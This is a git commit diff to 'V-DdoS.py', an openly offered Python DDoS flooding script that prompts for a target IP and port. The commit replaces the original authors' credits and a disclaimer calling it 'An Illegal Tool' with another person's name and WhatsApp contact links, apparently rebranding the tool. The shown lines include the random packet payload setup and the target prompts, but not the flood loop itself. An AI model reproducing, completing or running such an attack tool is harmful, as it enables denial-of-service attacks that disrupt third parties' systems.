a0314e43f23a0d7aa82c4b70f3d9a2042689486a
الكنج حمودي الاسطوره <mogsnfknsgqns@gmail.com>
2024-08-22 20:51:35 +0300

    Update V-DdoS.py

--- V-DdoS.py
+++ V-DdoS.py
@@ -21,21 +21,17 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet V-DdoS")
 print
-print "Coded By : Mr.BL4Z3"
-print "Author   : T34m V18rs"
-print "Github   : github.com/T34mV18rs"
-print "Fb Page  : facebook.com/TeamVirusOfficial"
-print "FB Group : facebook.com/groups/mohinhossen"
-print "Telegram : t.me/Crackerspace"
-print "Join Cracker Space TG Group To Get Premium Apk(s) Free"
-print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems"
+print "Mohammed Al -Ahmadi: Mohammed Al -Ahmadi"
+print "Developer: Mohammed Al -Ahmadi"
+print "My number call:https://wa.me/967778239092"
+print " My number WhatsApp :https://wa.me/967738325474"
 print
-ip = raw_input("IP Target : ")
+ip = raw_input("الايبي الموقع  : ")
 port = input("Port       : ")
 os.system("clear")
 print("\033[93m")
 os.system("figlet DdoS Attack")
-print("Team : T34m V18rs")
+print("Team : Mohammed Al -Ahmadi")
 print ("\033[92m")
 print "[                    ] 0% "
 time.sleep(5)
